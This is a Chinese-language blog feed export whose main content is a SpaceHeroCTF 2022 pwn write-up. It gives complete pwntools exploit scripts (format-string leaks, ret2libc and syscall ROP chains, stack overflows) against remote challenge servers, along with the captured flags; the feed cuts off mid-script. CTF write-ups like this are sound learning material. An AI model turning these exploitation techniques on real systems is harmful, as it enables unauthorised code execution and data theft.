class="number">0</span>)&#125;),</span><br><span class="line">            builder.<span class="built_in">getInt32</span>(<span class="number">1089</span>), builder.<span class="built_in">getInt32</span>(<span class="number">420</span>) &#125;);</span><br><span class="line">    Value* call1 = builder.<span class="built_in">CreateCall</span>(<span class="built_in">get_flock_function</span>(<span class="keyword">module</span>),</span><br><span class="line">        &#123; call, builder.<span class="built_in">getInt32</span>(<span class="number">2</span>) &#125;);</span><br><span class="line">    Value* call2 = builder.<span class="built_in">CreateCall</span>(<span class="built_in">get_write_function</span>(<span class="keyword">module</span>),</span><br><span class="line">        &#123; call, builder.<span class="built_in">CreateInBoundsGEP</span>(func_name, &#123;builder.<span class="built_in">getInt32</span>(<span class="number">0</span>), builder.<span class="built_in">getInt32</span>(<span class="number">0</span>)&#125;),</span><br><span class="line">            func_name_size &#125;);</span><br><span class="line">    Value* call3 = builder.<span class="built_in">CreateCall</span>(<span class="built_in">get_write_function</span>(<span class="keyword">module</span>),</span><br><span class="line">        &#123; call, builder.<span class="built_in">CreateInBoundsGEP</span>(newline, &#123;builder.<span class="built_in">getInt32</span>(<span class="number">0</span>), builder.<span class="built_in">getInt32</span>(<span class="number">0</span>)&#125;),</span><br><span class="line">            builder.<span class="built_in">getInt32</span>(<span class="number">1</span>) &#125;);</span><br><span class="line">    Value* call4 = builder.<span class="built_in">CreateCall</span>(<span class="built_in">get_write_function</span>(<span class="keyword">module</span>),</span><br><span class="line">        &#123; call, buffer, size &#125;);</span><br><span class="line">    Value* call5 = builder.<span class="built_in">CreateCall</span>(<span class="built_in">get_write_function</span>(<span class="keyword">module</span>),</span><br><span class="line">        &#123; call, builder.<span class="built_in">CreateInBoundsGEP</span>(newline, &#123;builder.<span class="built_in">getInt32</span>(<span class="number">0</span>), builder.<span class="built_in">getInt32</span>(<span class="number">0</span>)&#125;), builder.<span class="built_in">getInt32</span>(<span class="number">1</span>) &#125;);</span><br><span class="line">    Value* call6 = builder.<span class="built_in">CreateCall</span>(<span class="built_in">get_write_function</span>(<span class="keyword">module</span>),</span><br><span class="line">        &#123; call, builder.<span class="built_in">CreateInBoundsGEP</span>(splitter, &#123;builder.<span class="built_in">getInt32</span>(<span class="number">0</span>), builder.<span class="built_in">getInt32</span>(<span class="number">0</span>)&#125;), splitter_size &#125;);</span><br><span class="line">    Value* call7 = builder.<span class="built_in">CreateCall</span>(<span class="built_in">get_flock_function</span>(<span class="keyword">module</span>),</span><br><span class="line">        &#123; call, builder.<span class="built_in">getInt32</span>(<span class="number">8</span>)&#125; );</span><br><span class="line">    Value* call8 = builder.<span class="built_in">CreateCall</span>(<span class="built_in">get_close_function</span>(<span class="keyword">module</span>),</span><br><span class="line">        &#123; call &#125;);</span><br><span class="line">    builder.<span class="built_in">CreateBr</span>(link);</span><br><span class="line"></span><br><span class="line">    Logger::<span class="built_in">get</span>()-&gt;<span class="built_in">log</span>(INFO, <span class="string">&quot;Collect Instrumented at &quot;</span> + <span class="built_in">string</span>(<span class="keyword">this</span>-&gt;f-&gt;<span class="built_in">getName</span>()));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用到很多次的<code>create_call</code>。参数为函数类型，自己调用的函数，参数列表，twine是一种用字符串表示的临时变量。最后一个mdnode实在没看明白。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220412174958624.png" alt="image-20220412174958624"></p><h2 id="运行结果"><a href="#运行结果" class="headerlink" title="运行结果"></a>运行结果</h2><p>以下是运行了seed之后的结果。</p><p><img src="/2022/04/04/FuzzBuilder-src-understand/image-20220411220955272.png" alt="image-20220411220955272"></p>]]></content>
      
      
      <categories>
          
          <category> projects </category>
          
      </categories>
      
      
        <tags>
            
            <tag> llvm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SpaceHeroCTF2022_pwn_wp</title>
      <link href="/2022/04/04/SpaceHeroCTF2022-pwn-wp/"/>
      <url>/2022/04/04/SpaceHeroCTF2022-pwn-wp/</url>
      
        <content type="html"><![CDATA[<p>2022 spaceheroCTF（shctf）有关pwn的writeup。相关附件我放在<a href="https://github.com/Nicholas-wei/pwn/tree/main/shctf">链接</a></p><span id="more"></span><p>松神AK re太强了，海伟哥单砍高分pwn题太强了，我啥也不会，太菜了！！！！要多多努力！！！！</p><p><img src="/2022/04/04/SpaceHeroCTF2022-pwn-wp/QQ%E5%9B%BE%E7%89%8720220404160511.jpg" alt="QQ图片20220404160511"></p><h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><h2 id="guardians-of-galaxy"><a href="#guardians-of-galaxy" class="headerlink" title="guardians of galaxy"></a>guardians of galaxy</h2><p>白给x64格式化字符串</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./guardians&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>,<span class="number">12690</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;brva 0x1302&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Does Quill manage to win the dance battle?&#x27;</span>)</span><br><span class="line">payload = <span class="string">&quot;%12$p.%13$p.%14$p.%15$p.%16$p.%17$p.%18$p&quot;</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="warm-up-to-dark-side"><a href="#warm-up-to-dark-side" class="headerlink" title="warm up to dark side"></a>warm up to dark side</h2><p>盲打，但是白给system地址</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># filename=&quot;&quot;</span></span><br><span class="line"><span class="comment"># libc_name=&quot;&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">30096</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># elf=ELF(filename)</span></span><br><span class="line"><span class="comment"># libc=ELF(libc_name)</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;The Dark Side resides at: &#x27;</span>)</span><br><span class="line">addr = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;addr: &quot;</span> + <span class="built_in">hex</span>(addr))</span><br><span class="line">io.sendline(p64(addr)*<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h2 id="vader"><a href="#vader" class="headerlink" title="vader"></a>vader</h2><p>直接ROP libcSearcher查不到偏移，网上查到是<code>libc6_2.33-3_amd64</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./vader&quot;</span></span><br><span class="line"><span class="comment"># libc_name=&quot;&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>,<span class="number">20712</span>)</span><br><span class="line"><span class="comment"># context.log_level=&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line"><span class="comment"># libc=ELF(libc_name)</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi = <span class="number">0x000000000040165b</span></span><br><span class="line"><span class="comment"># gdb.attach(io,&quot;b *0x4015F9&quot;)</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Now I am the master &gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">payload1 = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload1+=<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span></span><br><span class="line">payload1 +=p64(pop_rdi)</span><br><span class="line">payload1+=p64(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload1+=p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">payload1+=p64(<span class="number">0x4015B5</span>)</span><br><span class="line">io.sendline(payload1)</span><br><span class="line">libc_info = u64(io.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">success(<span class="string">&quot;libc_info: &quot;</span> + <span class="built_in">hex</span>(libc_info))</span><br><span class="line"><span class="comment"># libc = LibcSearcher(&quot;printf&quot;,libc_info)</span></span><br><span class="line">libc_base = libc_info - <span class="number">0x75de0</span></span><br><span class="line">success(<span class="string">&quot;libc_base: &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">system = libc_base + <span class="number">0x49850</span></span><br><span class="line">binsh = libc_base + <span class="number">0x188962</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Now I am the master &gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">payload2 = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload2+=<span class="string">b&quot;a&quot;</span>*<span class="number">0x28</span></span><br><span class="line">payload2 +=p64(pop_rdi)</span><br><span class="line">payload2+=p64(binsh)</span><br><span class="line">payload2+=p64(system)</span><br><span class="line"><span class="comment"># payload1+=p64(0x4015B5)</span></span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>shctf&#123;th3r3-1s-n0-try&#125;</code></p><h2 id="T0NY-TR4N5L4T0R"><a href="#T0NY-TR4N5L4T0R" class="headerlink" title="T0NY TR4N5L4T0R"></a>T0NY TR4N5L4T0R</h2><p>不知道啥逻辑 反正控到指针了，直接调回main就好了<br>io_buf他没清零，远程端有点问题，直接发payload就可以了，本地io和题目一样。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;split&#x27;</span>, <span class="string">&#x27;-hp&#x27;</span>, <span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"><span class="comment">#io = process(&#x27;./leet&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&quot;0.cloud.chals.io&quot;</span>,<span class="number">26008</span>)</span><br><span class="line"><span class="comment">#io.recvuntil(b&#x27;W31c0m3 70 70ny\&#x27;5 7r4n51470r.&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io,</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># b *0x0804938d</span></span><br><span class="line"><span class="comment"># &#x27;&#x27;&#x27;)</span></span><br><span class="line">io.sendline(<span class="string">b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaana&#x27;</span>+p32(<span class="number">0x0804921d</span>)+<span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>shctf&#123;Y00_175_70NY_574RK&#125;</code></p><h2 id="satisfied"><a href="#satisfied" class="headerlink" title="satisfied"></a>satisfied</h2><p><code>shctf&#123;Whos-Th3-k1ng-of-Ur-Sat3ll1te-Castl3&#125;</code><br>用z3求解约束即可。这个binary有个printf没有换行，导致输出很麻烦，本地调试要patch一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./satisfy&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>,<span class="number">34720</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">solve</span>(<span class="params">random_num</span>):</span><br><span class="line">    a1=BitVec(<span class="string">&quot;a1&quot;</span>,<span class="number">64</span>)</span><br><span class="line">    a2=BitVec(<span class="string">&quot;a2&quot;</span>,<span class="number">64</span>) <span class="comment"># lefy char</span></span><br><span class="line">    <span class="comment"># result = BitVecVal(31337,32)</span></span><br><span class="line">    result = <span class="number">31337</span></span><br><span class="line">    random_ = BitVecVal(random_num,<span class="number">64</span>)</span><br><span class="line">    solver=Solver()</span><br><span class="line">    solver.add(((a1&lt;&lt;a2)^random_ )== result)</span><br><span class="line">    solver.check()</span><br><span class="line">    m = solver.model()</span><br><span class="line">    a1_ans = <span class="built_in">int</span>(<span class="built_in">str</span>(m.evaluate(a1)))</span><br><span class="line">    a2_ans = <span class="built_in">int</span>(<span class="built_in">str</span>(m.evaluate(a2)))</span><br><span class="line">    success(<span class="string">&quot;a1: &quot;</span> + <span class="built_in">hex</span>(a1_ans))</span><br><span class="line">    success(<span class="string">&quot;a2: &quot;</span> + <span class="built_in">hex</span>(a2_ans))</span><br><span class="line">    <span class="keyword">return</span>(a1_ans,a2_ans)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;b *0x4014C0\n&quot;</span> <span class="comment"># b compare</span></span><br><span class="line">    cmd +=<span class="string">&quot;b *0x40143B\n&quot;</span> <span class="comment">#b func_start</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">io.recvuntil(<span class="string">&#x27;Here is a random token &#x27;</span>)</span><br><span class="line">token = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>))</span><br><span class="line">success(<span class="string">&quot;token: &quot;</span> + <span class="built_in">str</span>(token))</span><br><span class="line">(a1,a2) = solve(token)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;response &gt;&gt;&gt;&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&quot;&quot;</span></span><br><span class="line">payload +=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">payload +=p64(a2)</span><br><span class="line">payload += p64(a1)</span><br><span class="line">payload = payload.ljust(<span class="number">0x28</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">payload+=p64(<span class="number">0x4013AA</span>)*<span class="number">5</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Rocket"><a href="#Rocket" class="headerlink" title="Rocket"></a>Rocket</h2><p><code>shctf&#123;1-sma11-St3p-f0r-mAn-1-Giant-l3ap-f0r-manK1nd&#125;</code><br>我傻了根本不用泄露libc。直接猜heap_base然后orw就可以了..</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./rocket&quot;</span></span><br><span class="line">libc_name=<span class="string">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>,<span class="number">13163</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line">libc=ELF(libc_name)</span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    cmd = <span class="string">&quot;&quot;</span></span><br><span class="line">    cmd +=<span class="string">&quot;brva 0x1604&quot;</span> <span class="comment">#ret</span></span><br><span class="line">    <span class="comment"># cmd +=&quot;brva 0x1579&quot; # printf</span></span><br><span class="line">    <span class="comment"># cmd +=&quot;brva 0x15A3&quot;</span></span><br><span class="line">    gdb.attach(io,cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;authenticate &gt;&gt;&gt;\n&#x27;</span>)</span><br><span class="line">offset = <span class="number">10</span></span><br><span class="line"><span class="comment"># fmt_payload = b&quot;%6$p.%7$p.%8$p.%9$p.%10$p.%11$p.%12$p.%13$p.%14$p.%15$p.%16$p.%17$p.%18$p&quot;</span></span><br><span class="line">fmt_payload = <span class="string">&quot;%6$p&quot;</span></span><br><span class="line">io.sendline(fmt_payload)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;&lt;&lt;&lt; Welcome: &#x27;</span>)</span><br><span class="line">code_base = <span class="built_in">int</span>(io.recvuntil(<span class="string">&#x27;\n&#x27;</span>,drop=<span class="literal">True</span>),<span class="number">16</span>)-<span class="number">0x10e0</span></span><br><span class="line">success(<span class="string">&quot;code_base: &quot;</span> + <span class="built_in">hex</span>(code_base))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag_txt = <span class="number">0x002db8</span>+code_base</span><br><span class="line">pop_rdi = <span class="number">0x000000000000168b</span>+code_base</span><br><span class="line">pop_rax = <span class="number">0x0000000000001210</span>+code_base</span><br><span class="line">pop_rsi_pop_r15 = <span class="number">0x0000000000001689</span>+code_base</span><br><span class="line">pop_rdx = <span class="number">0x00000000000014be</span>+code_base</span><br><span class="line">syscall_ret = <span class="number">0x00000000000014db</span>+code_base</span><br><span class="line"></span><br><span class="line">rop_chain = <span class="string">b&quot;&quot;</span></span><br><span class="line"><span class="comment"># open</span></span><br><span class="line">rop_chain +=p64(pop_rax)</span><br><span class="line">rop_chain +=p64(<span class="number">2</span>)</span><br><span class="line">rop_chain+=p64(pop_rdi)</span><br><span class="line">rop_chain+=p64(flag_txt)</span><br><span class="line">rop_chain+=p64(pop_rsi_pop_r15)</span><br><span class="line">rop_chain+=p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">rop_chain+=p64(pop_rdx)</span><br><span class="line">rop_chain+=p64(<span class="number">0</span>)</span><br><span class="line">rop_chain+=p64(syscall_ret)</span><br><span class="line"><span class="comment">#read</span></span><br><span class="line">rop_chain +=p64(pop_rax)</span><br><span class="line">rop_chain+=p64(<span class="number">0</span>)</span><br><span class="line">rop_chain+=p64(pop_rdi)</span><br><span class="line">rop_chain+=p64(<span class="number">3</span>)</span><br><span class="line">rop_chain+=p64(pop_rsi_pop_r15)</span><br><span class="line">rop_chain+=p64(code_base+<span class="number">0x5800</span>) <span class="comment"># buffer</span></span><br><span class="line">rop_chain+=p64(<span class="number">0</span>)</span><br><span class="line">rop_chain+=p64(pop_rdx)</span><br><span class="line">rop_chain+=p64(<span class="number">0x100</span>)</span><br><span class="line">rop_chain+=p64(syscall_ret)</span><br><span class="line"><span class="comment"># write</span></span><br><span class="line">rop_chain+=p64(pop_rax)</span><br><span class="line">rop_chain+=p64(<span class="number">1</span>)</span><br><span class="line">rop_chain+=p64(pop_rdi)</span><br><span class="line">rop_chain+=p64(<span class="number">1</span>)</span><br><span class="line">rop_chain+=p64(pop_rsi_pop_r15)</span><br><span class="line">rop_chain+=p64(code_base+<span class="number">0x5800</span>)</span><br><span class="line">rop_chain+=p64(<span class="number">0</span>)</span><br><span class="line">rop_chain+=p64(pop_rdx)</span><br><span class="line">rop_chain+=p64(<span class="number">0x100</span>)</span><br><span class="line">rop_chain+=p64(syscall_ret)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">rop_payload =<span class="string">b&quot;a&quot;</span>*<span class="number">0x48</span> + rop_chain</span><br><span class="line"></span><br><span class="line"><span class="comment"># debug()</span></span><br><span class="line">io.sendlineafter(<span class="string">&#x27;&gt;&gt;&gt;\n&#x27;</span>,rop_payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Star-Wars-Galaxies-2"><a href="#Star-Wars-Galaxies-2" class="headerlink" title="Star Wars Galaxies 2"></a>Star Wars Galaxies 2</h2><p><code>shctf&#123;l00k1ng_f0rw4rd_2_k0t0r_r3m4k3&#125;</code><br>真的是绝了。。。fmtstr_payload给我用%lln写一个一byte的数据。不然俩小时前就做出来了。不知道这算不算是bug。<br>用格式化字符串改栈上数据即可。就是要小心一点很容易多改。而且远程可能要多试几次才行。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">filename=<span class="string">&quot;./starwar&quot;</span></span><br><span class="line"><span class="comment"># libc_name=&quot;&quot;</span></span><br><span class="line"><span class="comment"># io = process(filename)</span></span><br><span class="line">io = remote(<span class="string">&#x27;0.cloud.chals.io&#x27;</span>, <span class="number">34916</span>)</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">elf=ELF(filename)</span><br><span class="line"><span class="comment"># libc=ELF(libc_name)</span></span><br><span class="line">context.terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split&#x27;</span>,<span class="string">&#x27;-hp&#x27;</span>,<span class="string">&#x27;60&#x27;</span>]</span><br><span class="line">context.arch = <span 